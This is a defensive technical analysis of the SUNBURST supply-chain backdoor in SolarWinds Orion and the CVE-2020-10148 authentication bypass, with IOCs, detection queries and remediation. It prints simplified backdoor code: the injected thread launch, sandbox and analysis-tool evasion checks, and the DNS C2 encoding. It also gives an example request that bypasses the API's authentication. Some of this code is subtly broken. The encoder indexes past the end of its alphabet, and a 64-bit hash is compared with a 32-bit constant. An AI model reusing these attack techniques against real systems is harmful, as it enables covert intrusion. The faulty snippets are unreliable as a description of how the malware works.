# SolarWinds Orion — SUNBURST Supply Chain Attack - CVE-2020-10148


Attribution: 
> **Type:** Software Supply Chain Attack / Nation-State Espionage
> 
> **Severity:** Critical (CVSS 10.0)
> 
> **Exposure window:** March–June 2020 (trojanized updates distributed)
> 
> **Attribution:** NOBELIUM / APT29 / Cozy Bear (Russian SVR)
> 
> **Malware families:** SUNBURST (SUNSPOT → SUNBURST → TEARDROP/RAINDROP → Cobalt Strike)

# SUNBURST — Full Technical Analysis

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Background: SolarWinds & Orion](#background-solarwinds--orion)
3. [Threat Actor: NOBELIUM / APT29](#threat-actor-nobelium--apt29)
4. [Attack Timeline](#attack-timeline)
5. [Attack Chain — Stage by Stage](#attack-chain--stage-by-stage)
   - [Stage 0 — Initial Access: Build Pipeline Compromise](#stage-0--initial-access-build-pipeline-compromise)
   - [Stage 1 — Test Injection (Dry Run)](#stage-1--test-injection-dry-run)
   - [Stage 2 — Weaponized DLL Injection](#stage-2--weaponized-dll-injection)
   - [Stage 3 — Signed Distribution via Legitimate Update](#stage-3--signed-distribution-via-legitimate-update)
   - [Stage 4 — SUNBURST Dormancy & Environmental Checks](#stage-4--sunburst-dormancy--environmental-checks)
   - [Stage 5 — DNS Beaconing & C2 Activation](#stage-5--dns-beaconing--c2-activation)
   - [Stage 6 — Post-Exploitation: TEARDROP & Cobalt Strike](#stage-6--post-exploitation-teardrop--cobalt-strike)
   - [Stage 7 — RAINDROP & Lateral Movement](#stage-7--raindrop--lateral-movement)
   - [Stage 8 — Golden SAML & Cloud Pivot](#stage-8--golden-saml--cloud-pivot)
6. [DLL Analysis: The Malicious Code](#dll-analysis-the-malicious-code)
7. [CVE-2020-10148: The API Authentication Bypass](#cve-2020-10148-the-api-authentication-bypass)
8. [Obfuscation & Evasion Techniques](#obfuscation--evasion-techniques)
9. [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
10. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
11. [Detection](#detection)
12. [Remediation](#remediation)
13. [Systemic Lessons](#systemic-lessons)
14. [References](#references)

---

## Executive Summary

Between October 2019 and December 2020, threat actors operating on behalf of the Russian Foreign Intelligence Service (SVR) executed a multi-stage operation culminating in the most significant software supply chain attack in recorded history. By compromising the build environment of SolarWinds — a US company whose Orion Platform is used by thousands of government agencies and enterprises to manage their IT infrastructure — the attackers inserted a fully functional backdoor into a legitimate, digitally-signed software update.

The SUNBURST backdoor was delivered to approximately **18,000 organizations** as a routine software update. Of those, the attackers selectively activated the backdoor in roughly **100 high-value targets**, conducting intelligence operations that lasted months before discovery. The victims included the US Treasury, the Department of Justice, the State Department, DHS, parts of the Pentagon, NATO, and dozens of major corporations.

The attack was discovered not by SolarWinds, not by the US government's own security apparatus, but by **FireEye** — while investigating the theft of their own red team tools.

---

## Background: SolarWinds & Orion

**SolarWinds** is a US IT management company headquartered in Austin, Texas. Their flagship product, the **Orion Platform**, is a network monitoring and management suite used to oversee the health of IT infrastructure — servers, endpoints, network devices, applications, and cloud services.

Orion's position in enterprise networks makes it an exceptionally high-value target:

- It runs with **highly privileged access** to all monitored systems
- It is commonly excluded from antivirus and EDR monitoring (per SolarWinds' own guidance, to reduce false positives)
- It communicates with virtually every device in an organization's environment
- Its outbound network traffic is considered normal and expected by security teams

Orion had approximately **33,000 customers** at the time of the attack, including:
- All five branches of the US military
- The Pentagon, State Department, DHS, Treasury, Justice Department
- The top 10 US telecommunications companies
- The top 5 US accounting firms
- Hundreds of universities and hospitals worldwide

---

## Threat Actor: NOBELIUM / APT29

The attack was attributed to a threat cluster tracked under multiple names:

| Vendor | Tracking Name |
|--------|---------------|
| Microsoft | NOBELIUM |
| Mandiant / FireEye | UNC2452 |
| CrowdStrike | StellarParticle |
| Volexity | Dark Halo |
| NCSC / CISA | APT29 / Cozy Bear |

The US government formally attributed the campaign to the **Russian Foreign Intelligence Service (SVR)** in April 2021. APT29 / Cozy Bear is the same threat actor previously associated with the 2016 Democratic National Committee breach and multiple espionage campaigns targeting government and defense organizations since at least 2008.

Key characteristics of this actor:
- Long-dwell, patient operations (months to years in target environments)
- Priority on stealth over speed
- Sophisticated counter-forensics and living-off-the-land techniques
- Focus on intelligence collection rather than destructive attacks
- Historically targeted governments, think tanks, defense, and policy organizations

---

## Attack Timeline

```
2019-09-??   — Attackers breach SolarWinds internal network
2019-10-10   — First test injection into Orion source code (benign, "blank" code)
2020-02-20   — SUNBURST backdoor injected into Orion codebase
2020-03-26   — SolarWinds begins distributing Orion updates containing SUNBURST
               (update file: SolarWinds-Core-v2019.4.5220-Hotfix5.msp)
2020-03–05   — Trojanized updates distributed; backdoor installs on victim networks
               Dormancy period: 12–14 days before first C2 contact
2020-03–05   — Selective activation begins on high-value targets
               Victims include: US Treasury, DOJ, State Dept, DHS, FireEye, others
2020-06-??   — Attackers remove SUNBURST from SolarWinds build pipeline
               (operation complete; cleanup of intrusion into SolarWinds itself)
2020-12-08   — FireEye discloses theft of its own red team tools
               (they were investigating the compromise of their own network)
2020-12-13   — FireEye publishes SUNBURST analysis; SolarWinds issues advisory
               CISA issues Emergency Directive 21-01
               Microsoft, US-CERT, and NSA publish initial guidance
2020-12-14   — Microsoft seizes avsvmcloud[.]com C2 domain (kill switch)
2020-12-17   — CVE-2020-10148 disclosed (separate Orion API auth bypass)
2020-12-24   — SolarWinds releases patched Orion versions
2021-01-05   — US government formally confirms breach of multiple agencies
2021-04-15   — Biden administration formally attributes attack to Russian SVR;
               sanctions announced
```

**Total dwell time: ~9 months of undetected access across thousands of organizations**

---

## Attack Chain — Stage by Stage

### Stage 0 — Initial Access: Build Pipeline Compromise

The exact initial access vector into SolarWinds' network remains partially unclear, but forensic investigation established the following:

- Attackers breached SolarWinds' internal network **no later than September 2019**
- They gained access to the **Orion software build environment** — the system responsible for compiling, assembling, and signing Orion software releases
- Evidence suggests the breach may have originated via a **compromised SolarWinds employee credential**, possibly harvested from a publicly exposed system or a prior intrusion

Once inside the build environment, the attacker had access to the most sensitive asset in a software company's infrastructure: the process that produces signed, trusted software.

### Stage 1 — Test Injection (Dry Run)

In **October 2019**, attackers made their first modification to the Orion codebase — inserting **blank, benign code** with no malicious functionality. This test injection served several purposes:

1. **Validate build pipeline access** — confirm they could modify source code and have it compiled into the final DLL
2. **Verify signing** — confirm that a modified DLL still passed code-signing (it did, because the signing keys were also accessible in the build environment)
3. **Test distribution** — confirm that a modified DLL would be packaged into the update and distributed to customers

The attacker's patience here is remarkable. They had the capability to deploy malicious code in October 2019 and chose not to, instead spending months validating their delivery mechanism before weaponizing it.

### Stage 2 — Weaponized DLL Injection

On **February 20, 2020**, the attackers inserted the SUNBURST backdoor into the Orion source code.

The target was a specific method inside `SolarWinds.Orion.Core.BusinessLayer.dll`:

**The injection point — `RefreshInternal()`:**

```csharp
// LEGITIMATE CODE (simplified):
public void RefreshInternal()
{
    // ... normal Orion refresh logic ...
}

// MODIFIED BY ATTACKER:
public void RefreshInternal()
{
    // Single line added — launches backdoor in parallel thread:
    System.Threading.Thread thread = new System.Threading.Thread(
        OrionImprovementBusinessLayer.Initialize
    );
    thread.IsBackground = true;
    thread.Start();
    // ... normal Orion refresh logic continues unchanged ...
}
```

`RefreshInternal()` is called periodically by the Orion service — ensuring the backdoor runs continuously and persistently without any separate persistence mechanism. The modification is minimal: a single thread launch that doesn't alter `RefreshInternal()`'s normal behavior.

All malicious logic resided in the new class `OrionImprovementBusinessLayer`, named to blend with legitimate Orion telemetry classes.

### Stage 3 — Signed Distribution via Legitimate Update

Between **March and May 2020**, SolarWinds distributed the trojanized Orion updates through their normal update infrastructure. Because the DLL was compiled during the normal build process and signed with **SolarWinds' legitimate code-signing certificate**, it was indistinguishable from any other Orion update:

```
Update file: SolarWinds-Core-v2019.4.5220-Hotfix5.msp
Signed by:   SolarWinds Worldwide, LLC
Certificate: Valid, trusted
Distributor: downloads.solarwinds[.]com (official)
```

Any organization running Orion's automatic updates silently installed the backdoor as part of routine maintenance. No interaction required.

### Stage 4 — SUNBURST Dormancy & Environmental Checks

After installation, SUNBURST did **nothing for 12–14 days**. This dormancy period was deliberate — it placed the initial infection safely outside the typical 1–7 day window that most incident response investigations look back over.

Before activating, SUNBURST ran a series of environmental checks and would abort if it detected:

**Process blocklist (hash-checked):**
Any of the following processes running would cause SUNBURST to halt:

```
apimonitor-x64.exe    apimonitor-x86.exe    autopsy64.exe
autopsy.exe           autoruns.exe          autoruns64.exe
autorunsc.exe         autorunsc64.exe       binaryninja.exe
blacklight.exe        cff explorer.exe      cutter.exe
de4dot.exe            debugview.exe         diskmon.exe
dnsd.exe              dnspy.exe             dotpeek32.exe
dotpeek64.exe         dumpcap.exe           efexplorer.exe
exeinfope.exe         fakedns.exe           fakenet.exe
fiddler.exe           fileinsight.exe       floss.exe
gdb.exe               hexy.exe              hollows_hunter.exe
idaq.exe / idaq64     ifl / ifl64           immunitydebugger.exe
joeboxcontrol.exe     joeboxserver.exe      lord pe.exe
mDbg.exe              ollydbg.exe           pebrowse64.exe
peid.exe              pe-sieve32/64         pestudio.exe
peview.exe            ppee.exe              procdump.exe / 64
procdump64.exe        processhacker.exe     processmonitor.exe
prodisccover.exe      py2exedecompiler.exe  r2agent.exe
rabin2.exe            radare2.exe           rammap.exe
reko-decompiler.exe   regmon.exe            resourcehacker.exe
retdec.exe            rundotnetapp.exe      sbiesvc.exe
scdbg.exe             scylla_x64/86.exe     shellcode debugger
solarwindsdiagnostics sleuthkit.exe         sysinspector.exe
sysmon.exe / 64       sysmon64.exe          task explorer.exe
tcpdump.exe           tcpvcon.exe           tcpview.exe
totalcmd.exe / 64     trid.exe              tttracer.exe
udis86.exe            vboxservice.exe       vmtoolsd.exe
vmwaretray.exe / user vmwareuser.exe        vmsrvc.exe
vmusrvc.exe           WinDbg.exe            windump.exe
winobj.exe            wireshark.exe         x32dbg.exe / x64dbg
xwforensics.exe / 64
```

**Domain membership check:** If the host was not joined to an Active Directory domain, SUNBURST would not activate. The attacker was specifically hunting for enterprise networks.

**Domain name blocklist:** If the machine's domain contained strings associated with test/sandbox environments (e.g., `test`, `solarwinds`, `lab`, `dev`) the backdoor would also abort.

### Stage 5 — DNS Beaconing & C2 Activation

After passing all checks, SUNBURST contacted its C2 via a clever DNS-based mechanism:

1. The malware generated a **unique subdomain** of `avsvmcloud[.]com` by encoding the victim's:
   - Unique User ID (derived from hardware attributes)
   - Active Directory domain name
   
   Using a custom substitution cipher (a 15-character alphabet substitution scheme):

   ```
   Encoded domain example:
   r8stkst[.]appsync-api[.]eu-west-1[.]avsvmcloud[.]com
   └───────┘
   Encoded victim fingerprint (domain + UID)
   ```

2. The DNS lookup returned a **CNAME record** pointing to the actual attacker C2 infrastructure.

3. The attacker could then selectively respond to only the victims they chose to activate against — for all others, the DNS lookup simply returned `0.0.0.0` (no activation).

This mechanism served multiple purposes:
- It blended in with normal Orion telemetry traffic (the malware masqueraded as the **Orion Improvement Program** protocol)
- The C2 domain appeared legitimate and was pre-registered
- Selective activation via DNS response meant 99%+ of infected organizations never received a payload beyond the dormant backdoor

**C2 communication format:** SUNBURST's HTTP traffic masqueraded as Orion Improvement Program (OIP) protocol traffic, including realistic-looking headers, paths, and timing. Results were stored in legitimate-looking plugin configuration files.

### Stage 6 — Post-Exploitation: TEARDROP & Cobalt Strike

For selected high-value victims, SUNBURST received commands to download and execute **TEARDROP** — a custom memory-only dropper unique to this campaign.

TEARDROP characteristics:
- Runs entirely **in memory** (no disk artifacts)
- Reads from a file named `gracious_truth.jpg` — a fake JPEG containing an embedded payload preceded by a custom header (`0xFF 0xFE 0xFD 0xFC 0x0B 0x00 0x00 0x00`)
- Decodes and executes a **customized Cobalt Strike Beacon** payload
- The Cobalt Strike beacons were heavily customized to blend with legitimate traffic (including using Outlook.com as a malleable C2 profile)

Cobalt Strike capabilities used:
- Lateral movement via pass-the-hash and pass-the-ticket
- Credential dumping (`lsass` memory)
- Token impersonation
- Remote service creation
- Golden SAML attacks (see Stage 8)

### Stage 7 — RAINDROP & Lateral Movement

**RAINDROP** (discovered by Symantec in January 2021) was a second-stage loader similar to TEARDROP but with distinct differences, suggesting it was used selectively on different victims or at different stages:

- Also memory-only; no disk payload
- Used a different obfuscation and decoding mechanism than TEARDROP
- Delivered Cobalt Strike with a different configuration profile
- Found on systems that already had Cobalt Strike deployed, suggesting it was used for lateral movement rather than initial payload delivery

### Stage 8 — Golden SAML & Cloud Pivot

One of the most alarming aspects of the operation was the pivot from on-premise Orion deployments into **Microsoft 365 / Azure cloud environments** via **Golden SAML attacks**:

1. Attackers with access to on-premise Active Directory Federation Services (ADFS) servers extracted the **SAML token-signing certificate**
2. Using this certificate, they could forge arbitrary SAML authentication assertions
3. These forged tokens granted access to Microsoft 365 services (Exchange Online, SharePoint, Teams) as **any user in the organization** — including global admins
4. This access persisted independently of any password changes or MFA configurations
5. The cloud pivot left minimal logs and was nearly invisible to standard monitoring

This technique — using legitimate identity infrastructure to authenticate to cloud services — bypassed nearly all traditional detection controls.

---

## DLL Analysis: The Malicious Code

**File:** `SolarWinds.Orion.Core.BusinessLayer.dll`  
**MD5:** `b91ce2fa41029f6955bff20079468448`

The malicious class `OrionImprovementBusinessLayer` contained approximately 4,000 lines of carefully written C# code, structured to appear as legitimate Orion telemetry infrastructure.

**`Initialize()` method (entry point, simplified):**

```csharp
public static void Initialize()
{
    // 1. Check process name matches expected host
    if (GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) 
        != 17291806236368054941UL)  // hash of "solarwinds.businesslayerhost"
        return;

    // 2. Dormancy: wait until at least 12-14 days have elapsed
    // since first execution (checked via registry timestamp)
    DateTime firstRun = GetFirstRunTime();
    while ((DateTime.Now - firstRun).TotalDays < 12)
        Thread.Sleep(new Random().Next(2400000, 4800000)); // random sleep

    // 3. Environmental checks (domain membership, blocklists)
    if (!IsValidEnvironment()) return;

    // 4. Begin C2 communication loop
    Update();
}
```

**Domain name obfuscation (GetHash):**

All security product names, service names, and sensitive strings in SUNBURST were stored as **64-bit FNV-1a hashes** rather than plaintext strings. This prevented simple string scanning from detecting the blocklist:

```csharp
// Instead of checking: if (processName == "wireshark")
// SUNBURST checked:    if (GetHash(processName) == 0x5BFC54B7UL)

static ulong GetHash(string str)
{
    ulong num = 14695981039346656037UL;  // FNV offset basis
    foreach (char c in str.ToLower())
    {
        num ^= (ulong)c;
        num *= 1099511628211UL;          // FNV prime
    }
    return num;
}
```

**DNS subdomain encoding (simplified):**

```csharp
static string EncodeDomain(string userId, string domain)
{
    // Substitution alphabet (15 chars):
    const string alpha = "rq3gsalt6u1iknm";
    const string alpha2 = "0o2eavbdhu1i9jpkctnmzwqfg3y7xs854r6l";

    byte[] input = Encoding.UTF8.GetBytes(userId + domain);
    StringBuilder sb = new StringBuilder();

    foreach (byte b in input)
    {
        if (b >= 0x61 && b <= 0x7A)       // a-z
            sb.Append(alpha[b - 0x61]);
        else if (b >= 0x30 && b <= 0x39)  // 0-9
            sb.Append(alpha2[b - 0x30]);
        else
            sb.Append((char)b);
    }
    return sb.ToString() + ".appsync-api.eu-west-1.avsvmcloud.com";
}
```

---

## CVE-2020-10148: The API Authentication Bypass

**Note:** This CVE is distinct from the SUNBURST supply chain attack but was discovered in the same exposure window and affects the same product.

**Vulnerability:** The SolarWinds Orion API could be accessed without authentication by crafting specific parameters in the `Request.PathInfo` URI component.

**Root cause:** The Orion API's authentication middleware improperly parsed URIs containing specific path segments. When a request's `PathInfo` contained certain strings (such as `WebResource.axd`, `ScriptResource.axd`, `i18n.ashx`, or `Skipi18n`), the authentication check was bypassed entirely.

**Exploitation:**

```http
# Normal authenticated request:
GET /SolarWinds/InformationService/v3/Json/Query HTTP/1.1
Authorization: Bearer <token>

# CVE-2020-10148 bypass:
GET /SolarWinds/InformationService/v3/Json/Query?Skipi18n HTTP/1.1
# No Authorization header required — auth check is skipped
```

This vulnerability was used by a **separate threat actor** (not NOBELIUM) to deploy the **SUPERNOVA webshell** — a .NET web shell disguised as a legitimate SolarWinds API handler — onto vulnerable Orion servers without needing to compromise the supply chain.

**Affected versions:** 2019.2 HF3, 2018.4 HF3, 2018.2 HF6, and 2019.4 HF5 through 2020.2.1 HF1  
**Patched in:** 2020.2.1 HF2, 2019.4 HF6

---

## Obfuscation & Evasion Techniques

SUNBURST employed at least a dozen distinct evasion techniques, making it one of the most sophisticated pieces of malware analyzed:

| Technique | Implementation |
|-----------|---------------|
| **Hash-based string obfuscation** | FNV-1a hashing of all security tool names; no plaintext strings |
| **Dormancy period** | 12–14 day sleep before first C2 contact; evades short-window IR |
| **Environmental gating** | Domain membership check, process blocklist, domain name blocklist |
| **Traffic blending** | C2 comms masquerade as Orion Improvement Program telemetry |
| **Legitimate signing** | DLL signed with valid SolarWinds certificate; bypasses signature checks |
| **Legitimate binary** | Loaded by `SolarWinds.BusinessLayerHost.exe` — a known-good process |
| **AV exclusions** | SolarWinds guidance to exclude Orion from AV/EDR monitoring |
| **Memory-only payloads** | TEARDROP and RAINDROP run entirely in memory; no disk artifacts |
| **File camouflage** | TEARDROP payload embedded in fake JPEG (`gracious_truth.jpg`) |
| **DNS-based C2** | C2 via DNS resolution of unique subdomains; bypasses HTTP proxies |
| **Selective activation** | Only ~100 of 18,000 victims were activated; minimized exposure |
| **Minimal footprint** | Recon results stored in legitimate Orion config files |
| **Log tampering** | Evidence removed from SolarWinds build environment after operation complete |
| **SAML token forgery** | Cloud pivot without leaving standard authentication logs |

---

## Indicators of Compromise (IOCs)

### Malicious DLL Hashes

| Version | SHA-256 |
|---------|---------|
| 2019.4 HF5 | `32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77` |
| 2020.2 | `ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6` |
| 2020.2 HF1 (variant 1) | `019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134` |
| 2020.2 HF1 (variant 2) | `ac1b2b89e60707a20e9eb1ca480bc3410ead40643b386d624c5d21b47c02917c` |
| 2020.2 HF1 (variant 3) | `c09040d35630d75dfef0f804f320f8b3d16a481071076918e9b236a321c1ea77` |
| MD5 (any variant) | `b91ce2fa41029f6955bff20079468448` |

### Network / DNS

| Type | Value | Description |
|------|-------|-------------|
| Domain | `avsvmcloud[.]com` | Primary C2 domain (sinkholed by Microsoft Dec 14, 2020) |
| Pattern | `*.avsvmcloud.com` | All subdomains used for victim-specific beaconing |
| Domain | `databasegalore[.]com` | Secondary C2 |
| Domain | `deftsecurity[.]com` | Secondary C2 |
| Domain | `freescanonline[.]com` | Secondary C2 |
| Domain | `highdatabase[.]com` | Secondary C2 |
| Domain | `incomeupdate[.]com` | Secondary C2 |
| Domain | `panhardware[.]com` | Secondary C2 |
| Domain | `thedoccloud[.]com` | Secondary C2 |
| Domain | `websitetheme[.]com` | Secondary C2 |
| Domain | `zupertech[.]com` | Secondary C2 |

### File System Artifacts

| File | Description |
|------|-------------|
| `SolarWinds.Orion.Core.BusinessLayer.dll` | Malicious DLL (check hash vs table above) |
| `gracious_truth.jpg` | TEARDROP payload container (fake JPEG) |
| `%WINDIR%\SysWOW64\netsetupsvc.dll` | TEARDROP persistence location (some variants) |
| `%WINDIR%\System32\Netlogon\` | RAINDROP artifacts |

### Registry

| Key | Description |
|-----|-------------|
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList` | SUNBURST persistence (some variants) |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | SUNBURST Usage |
|--------|-----------|-----|----------------|
| Initial Access | Supply Chain Compromise | T1195.002 | Trojanized Orion update |
| Execution | Shared Modules | T1129 | DLL loaded by legitimate host process |
| Persistence | Hijack Execution Flow | T1574 | Modified DLL in legitimate update path |
| Defense Evasion | Obfuscated Files or Information | T1027 | FNV-1a hash obfuscation of strings |
| Defense Evasion | Masquerading | T1036 | Masquerade as Orion telemetry traffic |
| Defense Evasion | Indicator Removal | T1070 | Log tampering; self-cleanup |
| Defense Evasion | Trusted Developer Utilities | T1127 | Leveraged legitimate SolarWinds signing |
| Defense Evasion | Virtualization/Sandbox Evasion | T1497 | Environmental checks; dormancy period |
| Discovery | Process Discovery | T1057 | Blocklist check against running processes |
| Discovery | System Information Discovery | T1082 | Domain membership, hostname checks |
| Command & Control | DNS | T1071.004 | DNS-based beaconing to avsvmcloud.com |
| Command & Control | Encrypted Channel | T1573 | HTTPS to C2 |
| Command & Control | Ingress Tool Transfer | T1105 | TEARDROP download |
| Credential Access | OS Credential Dumping | T1003 | lsass dumping via Cobalt Strike |
| Lateral Movement | Pass the Hash | T1550.002 | Cobalt Strike lateral movement |
| Lateral Movement | Pass the Ticket | T1550.003 | Kerberos ticket abuse |
| Credential Access | Forge Web Credentials | T1606.002 | Golden SAML attacks |
| Collection | Email Collection | T1114 | M365 mail access via forged SAML tokens |

---

## Detection

### DLL Hash Verification (Windows — PowerShell)

```powershell
# Run as: .\check_dll_hash.ps1
# Or use poc/check_dll_hash.ps1

$dllPath = "C:\Program Files (x86)\SolarWinds\Orion\SolarWinds.Orion.Core.BusinessLayer.dll"
$knownBad = @(
    "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77",
    "ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6",
    "019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134",
    "ac1b2b89e60707a20e9eb1ca480bc3410ead40643b386d624c5d21b47c02917c",
    "c09040d35630d75dfef0f804f320f8b3d16a481071076918e9b236a321c1ea77"
)

if (Test-Path $dllPath) {
    $hash = (Get-FileHash $dllPath -Algorithm SHA256).Hash.ToLower()
    if ($knownBad -contains $hash) {
        Write-Host "[!!] COMPROMISED DLL DETECTED: $hash" -ForegroundColor Red
    } else {
        Write-Host "[OK] DLL hash clean: $hash" -ForegroundColor Green
    }
} else {
    Write-Host "[INFO] SolarWinds Orion DLL not found at default path" -ForegroundColor Yellow
}
```

### DNS Log Search

```bash
# Search for any DNS queries to avsvmcloud.com or known secondary C2 domains
grep -Ei "avsvmcloud|databasegalore|deftsecurity|freescanonline|highdatabase|\
incomeupdate|panhardware|thedoccloud|websitetheme|zupertech" \
  /var/log/syslog /var/log/dns.log /var/log/named.log 2>/dev/null
```

### SIEM / Splunk Queries

```splunk
# Detect DNS queries to C2 domain
index=dns_logs query="*.avsvmcloud.com"
| stats count by src_ip, query, _time

# Detect malicious DLL load (requires Sysmon EventCode 7)
index=sysmon EventCode=7
ImageLoaded="*SolarWinds.Orion.Core.BusinessLayer.dll"
| eval known_bad=mvappend(
    "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77",
    "ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6"
  )
| where SHA256 IN (known_bad)
| table _time, host, ImageLoaded, SHA256

# Detect Golden SAML (unusual ADFS token issuance)
index=windows_security EventCode=1202
"The Federation Service validated a new credential"
| stats count by src_ip, user, _time
| where count > 10
```

### Network Detection

Look for outbound HTTPS traffic from the Orion server to unexpected cloud provider IPs (SUNBURST routed through AWS AppSync endpoints):

```
Suspicious pattern: Orion server → *.amazonaws.com (unexpected region or endpoint)
Suspicious pattern: Orion server → *.azurewebsites.net (unexpected)
```

User-Agent in SUNBURST C2 traffic:

```
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
```

---

## Remediation

### Immediate Response

1. **Isolate the Orion server** from the network immediately
2. **Verify your DLL hash** against the known-bad list above
3. **Check Orion version** — if running 2019.4 HF5, 2020.2, or 2020.2 HF1: assume compromised
4. **Search network logs** for DNS queries to `avsvmcloud.com` between March–December 2020
5. **Preserve forensic evidence** before remediation (memory dump, disk image)

### If Compromise Confirmed

- Treat all credentials used on or accessible from the Orion server as compromised
- Rotate **all service account passwords** associated with monitored infrastructure
- Revoke all SAML token-signing certificates used by ADFS and regenerate
- Rotate all cloud service principal secrets and API keys
- Audit Azure AD / Microsoft 365 for new OAuth app registrations, new admin accounts, or unusual mail access
- Rebuild the Orion server from a known-good baseline

### Long-Term Patching

- Upgrade to Orion 2020.2.1 HF2 or later (addresses both SUNBURST and CVE-2020-10148)
- Apply the CVE-2020-10148 security patch if on older supported versions

### Preventive Hardening

- **Network segmentation:** Orion servers should not have unrestricted outbound internet access
- **Egress filtering:** Only allow Orion to reach known, specific monitoring endpoints
- **Privileged Access Workstations:** Restrict management access to Orion via hardened PAW infrastructure
- **Remove AV/EDR exclusions:** SolarWinds' guidance to exclude Orion from security scanning created a blind spot that allowed this attack to succeed
- **SAML hardening:** Implement conditional access policies; monitor ADFS token issuance
- **Software Bill of Materials (SBOM):** Require and validate SBOMs for all critical software dependencies
- **Build pipeline integrity:** Implement SLSA / in-toto attestations for software build chains

---

## Systemic Lessons

The SUNBURST attack exposed fundamental weaknesses in how the software industry and its customers approach trust:

**1. Code signing is not a guarantee of integrity**

A digitally signed DLL is trusted by virtually every security control in existence. SUNBURST demonstrated that if an attacker compromises the build environment that produces signed artifacts, the signature becomes a weapon rather than a protection. Build pipeline security must be treated with the same rigor as production systems.

**2. "Trusted software" is not the same as "secure software"**

Organizations explicitly trusted Orion with privileged access to all monitored infrastructure and explicitly excluded it from security monitoring. When the trusted software was compromised, there was no fallback. No privileged software should be exempt from behavioral monitoring.

**3. 18,000 installs, ~100 activations — the patience is the attack**

The attacker's selective activation strategy — deploying the backdoor to 18,000 victims but only activating against ~100 — is a masterclass in operational security. It minimized the attack surface for detection while maximizing the strategic value of access to the most sensitive targets.

**4. Supply chain attacks bypass perimeter defenses entirely**

Every firewall, IDS/IPS, SIEM alert, and endpoint agent at the victim organizations was irrelevant. The malware arrived signed, trusted, and delivered by the vendor. There was nothing for perimeter defenses to detect.

**5. 9 months is not an anomaly — it is the baseline**

The 9-month dwell time before discovery should not be treated as extraordinary. Nation-state APTs routinely maintain access for months or years. Detection strategies that focus on prevention rather than continuous behavioral monitoring are inadequate against this threat class.

**6. Discovery came from outside**

The US government's own security apparatus — DHS, NSA, CISA, Cyber Command — did not discover the breach. A private cybersecurity company (FireEye) discovered it while investigating an intrusion into their own network. This speaks to the systemic challenge of detecting lateral movement by patient, sophisticated actors who live entirely off the land.

---

## References

See [references.md](./references.md) for the full annotated source list.

---

*Analysis compiled from public threat intelligence by multiple vendors. Last updated: June 2026.*
